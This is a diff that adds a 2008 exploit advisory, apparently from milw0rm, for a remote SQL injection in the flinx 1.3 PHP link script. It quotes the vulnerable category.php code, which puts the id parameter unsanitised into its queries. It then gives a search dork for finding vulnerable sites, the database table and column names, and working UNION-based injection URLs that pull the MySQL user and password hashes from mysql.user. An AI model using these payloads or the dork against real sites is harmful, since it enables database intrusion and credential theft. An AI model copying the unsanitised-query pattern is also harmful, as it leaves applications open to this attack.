@@ -1,0 +1,42 @@
+--------------------------------------------------------------
+            H-T Team [ HouSSaMix + ToXiC350 + RxH ]
+--------------------------------------------------------------
+# Author : Houssamix From H-T Team
+# Script : flinx 1.3 & below                                          
+# Download : http://rapidshare.com/files/86100439/flinx.rar.html (Nulled)                         
+# BUG :  Remote SQL Injection Vulnerability  
+# Dork : Powered by Flinx
+
+## Vulnerable CODE :
+~~~~~~~~ category.php ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+<?
+$query="SELECT linkID FROM $table_link WHERE relCatID=$id";
+$queryl=mysql_query($query);
+$count=mysql_numrows($queryl);
+$result=mysql_query("SELECT name FROM $table_cat WHERE catID=$id");
+if ($row=mysql_fetch_array($result)){
+do{
+?>
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+# Exploit :
+[Target.il]/[flinx_path]/category.php?id=[SQL-CODE]
+
+tables and columns names
+=> table :  flinx_cat
+columns :  name / catid
+=> table : flinx_link
+columns :  name  / url / image / relCatID / width / height
+
+exemple :
+http://site.com/flinx/category.php?id=-999 union select name from flinx_cat--
+
+we can also try get user and password from mysql.user :
+our user needs to be root@localhost or administrator mysql, check:
+http://site.com/flinx/category.php?id=-999/**/union/**/select/**/user()/*
+user and password from mysql.user:
+http://site.com/flinx/category.php?id=concat(user,0x203a3a20,password)/**/from/**/mysql.user/*
+
+# Gr33tz :  CoNaN - V40 - Mahmood_ali - RaChiDoX & all muslims hackers       
+
+# milw0rm.com [2008-01-25]
